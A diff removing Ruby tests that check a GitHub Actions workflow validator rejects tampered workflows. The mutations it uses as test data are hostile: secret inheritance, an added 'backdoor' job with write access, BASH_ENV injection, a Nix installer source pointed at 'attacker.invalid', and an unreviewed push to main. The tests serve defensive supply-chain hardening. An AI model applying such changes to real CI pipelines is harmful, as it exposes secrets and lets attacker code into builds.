-    step = mutated.dig("jobs", "plan", "steps").find do |candidate|
-      candidate["name"] == "Validate caller trust boundary"
-    end
-    step["run"] = step["run"].sub("Automattic/kandelo", "untrusted/kandelo")
-    check_publisher(mutated)
-  end
-  expect_rejection("maintenance secret inheritance") do
-    mutated = deep_copy(maintenance)
-    mutated.dig("jobs", "rebuild-or-repair")["secrets"] = "inherit"
-    check_maintenance(mutated)
-  end
-  expect_rejection("an extra maintenance job") do
-    mutated = deep_copy(maintenance)
-    mutated.fetch("jobs")["backdoor"] = {
-      "permissions" => { "contents" => "write" },
-      "runs-on" => "ubuntu-latest",
-      "steps" => [{ "run" => "true" }],
-    }
-    check_maintenance(mutated)
-  end
-  expect_rejection("maintenance top-level environment injection") do
-    mutated = deep_copy(maintenance)
-    mutated["env"] = { "BASH_ENV" => "/tmp/backdoor" }
-    check_maintenance(mutated)
-  end
-  expect_rejection("an extra maintenance input") do
-    mutated = deep_copy(maintenance)
-    workflow_events(mutated).fetch("workflow_call").fetch("inputs")["tap-ref"] = {
-      "type" => "string",
-      "default" => "main",
-    }
-    check_maintenance(mutated)
-  end
-  expect_rejection("a self-hosted rollback") do
-    mutated = deep_copy(maintenance)
-    mutated.dig("jobs", "rollback")["runs-on"] = "self-hosted"
-    check_maintenance(mutated)
-  end
-  expect_rejection("a maintenance Nix installer source override") do
-    mutated = deep_copy(maintenance)
-    step = mutated.dig("jobs", "rollback", "steps").find do |candidate|
-      candidate["uses"].to_s.start_with?("DeterminateSystems/nix-installer-action@")
-    end
-    step.fetch("with")["source-url"] = "https://attacker.invalid/nix-installer"
-    check_maintenance(mutated)
-  end
-  expect_rejection("a static maintenance push step") do
-    mutated = deep_copy(maintenance)
-    mutated.dig("jobs", "rollback", "steps") << {
-      "name" => "Push unreviewed rollback",
-      "shell" => "bash",
-      "run" => "git -C tap push origin HEAD:main",
-    }
-    check_maintenance(mutated)
-  end
-  expect_rejection("removed rollback identifier validation") do
-    mutated = deep_copy(maintenance)
-    step = mutated.dig("jobs", "rollback", "steps").find do |candidate|
-      candidate["name"] == "Record rollback without replacing last-green metadata"
-    end
-    step["run"] = step["run"].sub("wasm32|wasm64", "anything")
-    check_maintenance(mutated)
   end
 end
 
